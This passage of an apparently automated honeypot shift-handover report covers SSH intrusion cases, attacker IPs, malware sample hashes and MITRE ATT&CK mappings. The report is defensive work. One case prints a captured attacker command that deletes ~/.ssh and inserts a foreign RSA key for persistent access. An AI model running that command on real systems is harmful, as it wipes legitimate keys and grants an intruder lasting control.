| `2026-04-07 12:55:10` | `cowrie.session.params` |
| `2026-04-07 12:55:10` | `cowrie.command.input` |
| `2026-04-07 12:55:16` | `cowrie.session.file_download` |
| `2026-04-07 12:55:16` | `cowrie.log.closed` |
| `2026-04-07 12:55:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.173.200[.]62` to AbuseIPDB if not already reported
- [ ] Block `172.173.200[.]62` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ac01f746782

| Field | Detail |
|---|---|
| **Source IP** | `172.173.200[.]62` |
| **First Seen** | 2026-04-07 12:55 |
| **Last Seen** | 2026-04-07 12:55 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 12:55:25` | `cowrie.session.connect` |
| `2026-04-07 12:55:27` | `cowrie.client.version` |
| `2026-04-07 12:55:30` | `cowrie.client.kex` |
| `2026-04-07 12:55:36` | `cowrie.login.success` |
| `2026-04-07 12:55:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.173.200[.]62` to AbuseIPDB if not already reported
- [ ] Block `172.173.200[.]62` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4362d0990560

| Field | Detail |
|---|---|
| **Source IP** | `172.173.200[.]62` |
| **First Seen** | 2026-04-07 13:00 |
| **Last Seen** | 2026-04-07 13:00 |
| **Session Duration** | 31s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 13:00:03` | `cowrie.session.connect` |
| `2026-04-07 13:00:04` | `cowrie.client.version` |
| `2026-04-07 13:00:04` | `cowrie.client.kex` |
| `2026-04-07 13:00:06` | `cowrie.login.success` |
| `2026-04-07 13:00:10` | `cowrie.session.params` |
| `2026-04-07 13:00:10` | `cowrie.command.input` |
| `2026-04-07 13:00:10` | `cowrie.command.failed` |
| `2026-04-07 13:00:11` | `cowrie.log.closed` |
| `2026-04-07 13:00:12` | `cowrie.session.params` |
| `2026-04-07 13:00:12` | `cowrie.command.input` |
| `2026-04-07 13:00:13` | `cowrie.session.file_download` |
| `2026-04-07 13:00:13` | `cowrie.log.closed` |
| `2026-04-07 13:00:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.173.200[.]62` to AbuseIPDB if not already reported
- [ ] Block `172.173.200[.]62` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a96397151512

| Field | Detail |
|---|---|
| **Source IP** | `172.173.200[.]62` |
| **First Seen** | 2026-04-07 13:00 |
| **Last Seen** | 2026-04-07 13:00 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 13:00:23` | `cowrie.session.connect` |
| `2026-04-07 13:00:23` | `cowrie.client.version` |
| `2026-04-07 13:00:24` | `cowrie.client.kex` |
| `2026-04-07 13:00:35` | `cowrie.login.success` |
| `2026-04-07 13:00:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.173.200[.]62` to AbuseIPDB if not already reported
- [ ] Block `172.173.200[.]62` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `170.79.37[.]82` | **28** | 2026-04-07 11:08 | 2026-04-07 11:43 | 0m | 28 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `172.173.200[.]62` | **27** | 2026-04-07 11:06 | 2026-04-07 13:10 | 3m | 21 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `118.194.234[.]8` | **25** | 2026-04-07 11:06 | 2026-04-07 11:52 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `147.135.251[.]134` | **25** | 2026-04-07 11:32 | 2026-04-07 12:10 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.118[.]226` | **9** | 2026-04-07 11:08 | 2026-04-07 11:29 | 12m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `100.48.87[.]238` | 1 | 2026-04-07 12:55 | 2026-04-07 12:55 | 1s | 0 | `T1592` | 🟢 LOW |
| `120.48.80[.]70` | 1 | 2026-04-07 11:09 | 2026-04-07 11:11 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.117[.]84` | 1 | 2026-04-07 11:09 | 2026-04-07 11:11 | 120s | 0 | `T1592` | 🟢 LOW |
| `150.246.249[.]149` | 1 | 2026-04-07 13:10 | 2026-04-07 13:10 | 31s | 0 | `T1592` | 🟢 LOW |
| `152.32.218[.]244` | 1 | 2026-04-07 11:34 | 2026-04-07 11:34 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `165.154.6[.]104` | 1 | 2026-04-07 11:35 | 2026-04-07 11:35 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `177.75.49[.]84` | 1 | 2026-04-07 11:51 | 2026-04-07 11:51 | 12s | 0 | `T1592` | 🟢 LOW |
| `180.76.184[.]79` | 1 | 2026-04-07 11:34 | 2026-04-07 11:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `71.6.199[.]87` | 1 | 2026-04-07 12:38 | 2026-04-07 12:38 | 10s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (21 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `177.75.49[.]84` | BR | EXPLORERNET INFOLINK TECNOLOGIA E TELECOMUNICACOES | **100** ⚠️ | 14 |
| `118.194.234[.]8` | SG | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 15 |
| `100.48.87[.]238` | US | Amazon Data Services Northern Virginia | **100** ⚠️ | 24 |
| `165.154.6[.]104` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 31 |
| `147.135.251[.]134` | FR | OVH Srl | **100** ⚠️ | 9 |
| `170.79.37[.]82` | PE | Telefonica del Peru S.A.A. | **100** ⚠️ | 50 |
| `71.6.199[.]87` | US | CariNet, Inc. | **100** ⚠️ | 50 |
| `120.48.80[.]70` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 46 |
| `14.103.117[.]84` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `150.246.249[.]149` | JP | So-net Service | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 196 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 104 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 75 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 39 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 39 |

---

## 🔕 False Positive Summary (4 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 3 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 202 cases |
| Tool 34  | Credential Extractor        | ✅ 179 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 18 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 4 filtered (2.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 12 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 21 files |
| Tool 33  | YARA Classifier             | ✅ 7 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 75 priority case(s) shown individually · 14 recon entry/entries in table (5 group(s) consolidating 114 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-07T13:15:12Z_
